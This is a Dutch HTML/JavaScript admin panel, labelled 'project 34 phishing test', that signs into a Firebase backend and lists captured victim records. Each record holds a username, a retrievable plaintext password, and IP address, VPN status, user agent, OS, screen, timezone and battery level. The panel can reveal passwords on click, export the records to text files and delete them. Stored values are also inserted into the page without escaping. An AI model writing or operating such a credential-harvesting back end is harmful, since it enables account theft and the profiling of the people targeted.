<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Project 34 Paneel – Terminal Login</title>

  <link href="../css/css.css" rel="stylesheet">
  <link href="../css/custom.css" rel="stylesheet" type="text/css">
  <link href="../css/ssrpm.css" rel="stylesheet" type="text/css">
  <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon">
  <link rel="icon" href="../images/favicon.ico" type="image/ico">
  <script src="../js/jquery.js"></script>
  <script src="../js/bootstrap.js"></script>

  <!-- Monospace -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#ffffff; --ink:#111111; --muted:#5a5a5a; --accent:#111; --blue:#0b6cf0;
      --line:#111; --danger:#e53935;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--ink);
      font-family:"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    }
    .wrap{max-width:1100px; margin:0 auto; padding:28px 16px 60px;}
    .terminal-line{white-space:pre-wrap; font-size:15px; line-height:1.55;}
    .muted{color:var(--muted)}
    .prompt{display:flex; align-items:center; gap:10px; margin:6px 0 16px;}
    .prompt-label{white-space:nowrap}
    .prompt-input{
      flex:1; border:none; border-bottom:1px solid var(--line); outline:none; padding:6px 4px;
      background:transparent; color:var(--ink); font:inherit;
    }
    .prompt-input::placeholder{color:#999}
    .prompt-input:focus{border-bottom-color:var(--blue); box-shadow:0 1px 0 0 var(--blue)}

    .error{color:var(--danger); margin:4px 0 0 0}
    .caret::after{content:"▁"; display:inline-block; margin-left:2px; animation:blink 1.1s steps(1,end) infinite}
    @keyframes blink{50%{opacity:0}}

    /* Paneel */
    .topbar{
      display:flex; gap:8px; flex-wrap:wrap; align-items:center; margin-bottom:12px;
    }
    .btn{
      border:1px solid var(--line); background:#fff; cursor:pointer; font:inherit; padding:6px 10px;
    }
    .btn.danger{border-color:var(--danger); color:var(--danger)}
    .btn.primary{border-color:var(--blue); color:var(--blue)}
    .btn[disabled]{opacity:.5; cursor:not-allowed}

    .grid{display:grid; grid-template-columns: 420px 1fr; gap:18px; margin-top:10px}
    @media (max-width: 980px){ .grid{grid-template-columns:1fr} }
    .box{border:1px solid var(--line); padding:12px; background:#fff}
    .box + .box{margin-top:10px}

    .search{
      display:flex; align-items:center; gap:10px; margin-bottom:10px;
      border:1px solid var(--line); padding:8px; background:#fff;
    }
    .search input{
      flex:1; border:none; outline:none; background:transparent; color:var(--ink); font:inherit;
    }

    .list{display:flex; flex-direction:column; gap:8px}
    .item{
      display:flex; align-items:center; gap:10px;
      border:1px solid var(--line); padding:8px 10px; cursor:pointer; background:#fff;
    }
    .item:hover{background:#f7f7f7}
    .item.selected{background:#111; color:#fff}
    .item .grow{flex:1; min-width:0}
    .item .kill{
      display:none; border:1px solid var(--danger); color:var(--danger);
      padding:2px 6px; background:#fff; cursor:pointer; font:inherit;
    }
    .item .pick{display:none}
    .edit-on .item .pick{display:inline-block}
    .edit-on .item .kill{display:inline-block}

    .detail-row{border:1px solid var(--line); padding:10px 12px; background:#fff}
    .mono{font-family:inherit}
    .h{font-weight:700; margin-bottom:6px}

    .pwd-chip{display:inline-block; padding:2px 6px; border:1px solid var(--line); cursor:pointer; user-select:none}
    .pwd-chip:hover{background:#f7f7f7}
  </style>

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
    import { getFirestore, collection, getDocs, query, orderBy, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
      authDomain: "project34-baebd.firebaseapp.com",
      projectId: "project34-baebd",
      storageBucket: "project34-baebd.firebasestorage.app",
      messagingSenderId: "92418567493",
      appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    onAuthStateChanged(auth, (user) => user ? renderPanel() : renderLogin());

    // ===== LOGIN =====
    function renderLogin(){
      document.body.innerHTML = `
        <div class="wrap">
          <div class="terminal-line">voer hier onder je email in</div>
          <div class="prompt">
            <div class="prompt-label">sgdc@spinoza-login%</div>
            <input id="email" class="prompt-input" type="email" placeholder="naam@voorbeeld.nl" autofocus />
          </div>

          <div class="terminal-line">voer hier onder je wachtwoord in</div>
          <div class="prompt">
            <div class="prompt-label">sgdc@spinoza-login%</div>
            <input id="password" class="prompt-input" type="password" placeholder="••••••••" />
          </div>

          <div id="msg" class="terminal-line muted caret">ready</div>
        </div>
      `;

      const emailEl = document.getElementById('email');
      const pwdEl   = document.getElementById('password');
      const msgEl   = document.getElementById('msg');

      function tryLogin(){
        const email = emailEl.value.trim();
        const pass  = pwdEl.value;
        if(!email || !pass){ showError(); return; }
        signInWithEmailAndPassword(auth, email, pass)
          .catch(() => showError());
      }

      function showError(){
        msgEl.classList.remove('muted','caret');
        msgEl.classList.add('error');
        msgEl.textContent = 'een van de ingevoerde gegevens is fout probeer opnieuw';
      }

      emailEl.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); pwdEl.focus(); } });
      pwdEl.addEventListener('keydown',   (e)=>{ if(e.key==='Enter'){ e.preventDefault(); tryLogin(); } });
    }

    // ===== PANEL =====
    async function renderPanel(){
      let users = [];
      try{
        const snap = await getDocs(query(collection(db,'users'), orderBy('timestamp','desc')));
        snap.forEach(docu => users.push({id:docu.id, ...docu.data()}));
      }catch(e){ /* ignore */ }

      let editMode = false;
      let selected = new Set();

      function nowStamp(){
        const d = new Date();
        const pad = (n)=> String(n).padStart(2,'0');
        return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
      }

      function tsToString(ts){
        const t = ts?.toDate ? ts.toDate() : (ts ? new Date(ts) : null);
        return t ? `${t.toLocaleDateString()} ${t.toLocaleTimeString()}` : 'Onbekend';
      }

      // MAIN LAYOUT
      document.body.innerHTML = `
        <div class="wrap">
          <div class="topbar">
            <button id="editBtn" class="btn">bewerk</button>
            <button id="selAllBtn" class="btn" disabled>selecteer alles</button>
            <button id="deselBtn" class="btn" disabled>deselecteer</button>
            <button id="delSelBtn" class="btn danger" disabled>verwijder geselecteerde</button>
            <button id="docListBtn" class="btn primary" disabled>maak document (lijst)</button>
            <button id="docDetBtn" class="btn primary" disabled>maak document (detail)</button>
            <span class="muted" style="margin-left:auto;">geselecteerd: <span id="selCount">0</span></span>
          </div>

          <div class="grid" id="gridRoot">
            <div id="leftCol">
              <div class="search">
                <span>zoek:</span>
                <input id="search" placeholder="gebruikersnaam…" />
                <button id="logoutBtn" class="btn">uitloggen</button>
              </div>
              <div class="box">
                <div class="h">lijst</div>
                <div id="list" class="list"></div>
              </div>
            </div>

            <div>
              <div class="box">
                <div class="h">details</div>
                <div id="details"><div class="detail-row muted">[ ] selecteer een gebruiker links.</div></div>
              </div>
            </div>
          </div>
        </div>
      `;

      const editBtn   = document.getElementById('editBtn');
      const selAllBtn = document.getElementById('selAllBtn');
      const deselBtn  = document.getElementById('deselBtn');
      const delSelBtn = document.getElementById('delSelBtn');
      const docListBtn= document.getElementById('docListBtn');
      const docDetBtn = document.getElementById('docDetBtn');
      const selCount  = document.getElementById('selCount');
      const search    = document.getElementById('search');
      const listEl    = document.getElementById('list');
      const detEl     = document.getElementById('details');
      const gridRoot  = document.getElementById('gridRoot');

      function updateActionState(){
        const hasSel = selected.size > 0;
        selAllBtn.disabled = !editMode || users.length===0;
        deselBtn.disabled  = !editMode || !hasSel;
        delSelBtn.disabled = !editMode || !hasSel;
        docListBtn.disabled= !hasSel;
        docDetBtn.disabled = !hasSel;
        selCount.textContent = String(selected.size);
        gridRoot.classList.toggle('edit-on', editMode);
      }

      function renderList(){
        const term = search.value.toLowerCase();
        listEl.innerHTML = users.map(u=>{
          const tsStr = tsToString(u.timestamp);
          const rowText = `- ${u.username || 'Onbekend'}${tsStr !== 'Onbekend' ? ` · ${tsStr}`:''}${u.ipAddress ? ` · ${u.ipAddress}`:''}`;
          const visible = rowText.toLowerCase().includes(term);
          const isSel = selected.has(u.id);
          return `
            <div class="item${isSel?' selected':''}" data-id="${u.id}" style="${visible?'':'display:none'}">
              <input class="pick" type="checkbox" ${isSel?'checked':''} data-id="${u.id}" />
              <div class="grow mono">${rowText}</div>
              <button class="kill" data-id="${u.id}">verwijder</button>
            </div>
          `;
        }).join('');
      }

      function openDetails(uid){
        const u = users.find(x=>x.id===uid); if(!u){ return; }
        const safePwd = (u.password && typeof u.password === 'string') ? u.password : 'Niet beschikbaar';
        const id = u.id;
        detEl.innerHTML = `
          <div class="detail-row">[ username ] ${u.username || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ password ] <span id="pwd-${id}" class="pwd-chip mono" data-state="hidden" data-value="${encodeHtml(safePwd)}">••••••••</span>  <span class="muted">— klik om te tonen/verbergen</span></div>
          <div class="detail-row">[ vpn ] ${u.vpnUsed===true?'Ja':(u.vpnUsed===false?'Nee':'Onbekend')}</div>
          <div class="detail-row">[ ip ] <span class="mono">${u.ipAddress || 'Niet beschikbaar'}</span></div>
          <div class="detail-row">[ server ] ${u.serverLocation || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ user-agent ] <span class="mono">${u.userAgent || 'Niet beschikbaar'}</span></div>
          <div class="detail-row">[ os ] ${u.operatingSystem || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ screen ] ${u.screenSize || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ lang ] ${u.language || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ tz ] ${u.timezone || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ battery ] ${u.battery || 'Niet beschikbaar'}</div>
          <div class="detail-row">[ timestamp ] ${tsToString(u.timestamp)}</div>
        `;
        const pwdEl = document.getElementById(`pwd-${id}`);
        pwdEl?.addEventListener('click', ()=>{
          const st = pwdEl.getAttribute('data-state');
          if(st==='hidden'){ pwdEl.textContent = pwdEl.getAttribute('data-value') || 'Niet beschikbaar'; pwdEl.setAttribute('data-state','shown'); }
          else { pwdEl.textContent = '••••••••'; pwdEl.setAttribute('data-state','hidden'); }
        });
      }

      function redraw(){
        renderList();
        wireListEvents();
        updateActionState();
      }

      function wireListEvents(){
        // click per rij
        listEl.querySelectorAll('.item').forEach(el=>{
          const uid = el.getAttribute('data-id');
          el.addEventListener('click', (e)=>{
            // klik op knoppen/checkboxen? die handelen het zelf af
            if(e.target.closest('.kill') || e.target.closest('.pick')) return;
            if(editMode){
              // toggle selectie
              if(selected.has(uid)) selected.delete(uid); else selected.add(uid);
              redraw();
            }else{
              // normale details
              listEl.querySelectorAll('.item').forEach(n=>n.classList.remove('selected'));
              el.classList.add('selected');
              openDetails(uid);
            }
          });
        });

        // per-item delete
        listEl.querySelectorAll('.kill').forEach(btn=>{
          btn.addEventListener('click', async (e)=>{
            e.stopPropagation();
            const uid = btn.getAttribute('data-id');
            await doDelete([uid]);
          });
        });

        // checkbox
        listEl.querySelectorAll('.pick').forEach(ch=>{
          ch.addEventListener('click', (e)=>{
            e.stopPropagation();
            const uid = ch.getAttribute('data-id');
            if(ch.checked) selected.add(uid); else selected.delete(uid);
            updateActionState();
          });
        });
      }

      async function doDelete(ids){
        if(!ids.length) return;
        // Firestore delete + local
        await Promise.all(ids.map(id => deleteDoc(doc(db,'users',id)).catch(()=>{})));
        users = users.filter(u => !ids.includes(u.id));
        ids.forEach(id => selected.delete(id));
        // reset detail als nodig
        detEl.innerHTML = `<div class="detail-row muted">[ ] selecteer een gebruiker links.</div>`;
        redraw();
      }

      function getSelectedUsers(){
        return users.filter(u => selected.has(u.id));
      }

      function asciiBox(lines){
        // lines: array of strings (no newlines)
        const width = Math.max(...lines.map(l => l.length));
        const border = '+' + '-'.repeat(width+2) + '+';
        const rows = lines.map(l => `| ${l.padEnd(width,' ')} |`);
        return [border, ...rows, border].join('\n');
      }

      function downloadText(filename, content){
        const blob = new Blob([content], {type:'text/plain;charset=utf-8'});
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        URL.revokeObjectURL(a.href);
        a.remove();
      }

      function makeDocList(){
        const chosen = getSelectedUsers();
        if(!chosen.length) return;
        const header = [
          'project 34 phishing test user list',
          `geselecteerde gebruikers: ${chosen.length}`,
          `timestamp: ${nowStamp()}`,
          ''
        ].join('\n');

        const boxes = chosen.map(u=>{
          const line = `${u.username || 'Onbekend'} - ${tsToString(u.timestamp)} - ${u.ipAddress || 'Onbekend'}`;
          return asciiBox([line]);
        }).join('\n');

        const out = header + boxes + '\n';
        const base = `project34-users-${new Date().toISOString().replace(/[:T]/g,'-').split('.')[0]}.txt`;
        downloadText(base, out);
      }

      function makeDocDetail(){
        const chosen = getSelectedUsers();
        if(!chosen.length) return;
        const header = [
          'project 34 phishing test detail list',
          `geselecteerde gebruikers: ${chosen.length}`,
          `timestamp: ${nowStamp()}`,
          ''
        ].join('\n');

        const boxes = chosen.map(u=>{
          const lines = [
            `gebruikersnaam: ${u.username || 'Niet beschikbaar'}`,
            `vpn status: ${u.vpnUsed===true?'Ja':(u.vpnUsed===false?'Nee':'Onbekend')}`,
            `ip: ${u.ipAddress || 'Niet beschikbaar'}`,
            `server: ${u.serverLocation || 'Niet beschikbaar'}`,
            `user agent: ${u.userAgent || 'Niet beschikbaar'}`,
            `os: ${u.operatingSystem || 'Niet beschikbaar'}`,
            `screen: ${u.screenSize || 'Niet beschikbaar'}`,
            `lang: ${u.language || 'Niet beschikbaar'}`,
            `tz: ${u.timezone || 'Niet beschikbaar'}`,
            `batterij: ${u.battery || 'Niet beschikbaar'}`,
            `timestamp binnengekomen: ${tsToString(u.timestamp)}`
          ];
          return asciiBox(lines);
        }).join('\n\n');

        const out = header + boxes + '\n';
        const base = `project34-details-${new Date().toISOString().replace(/[:T]/g,'-').split('.')[0]}.txt`;
        downloadText(base, out);
      }

      // Events topbar
      editBtn.addEventListener('click', ()=>{
        editMode = !editMode;
        editBtn.textContent = editMode ? 'bewerk (aan)' : 'bewerk';
        document.body.classList.toggle('edit-on', editMode);
        // in bewerk-modus geen detailselectie auto-highlight
        redraw();
      });

      selAllBtn.addEventListener('click', ()=>{
        users.forEach(u => selected.add(u.id));
        redraw();
      });

      deselBtn.addEventListener('click', ()=>{
        selected.clear();
        redraw();
      });

      delSelBtn.addEventListener('click', async ()=>{
        const ids = Array.from(selected);
        await doDelete(ids);
      });

      docListBtn.addEventListener('click', makeDocList);
      docDetBtn.addEventListener('click', makeDocDetail);

      // search
      search.addEventListener('input', ()=> redraw());

      // logout
      document.getElementById('logoutBtn').addEventListener('click', ()=> signOut(auth));

      // Helpers
      function encodeHtml(s){
        return String(s)
          .replaceAll('&','&amp;')
          .replaceAll('<','&lt;')
          .replaceAll('>','&gt;')
          .replaceAll('"','&quot;')
          .replaceAll("'","&#039;");
      }
      window.encodeHtml = encodeHtml;

      // initial draw
      redraw();
    }
  </script>
</head>
<body>
  <!-- Dynamisch -->
</body>
</html>
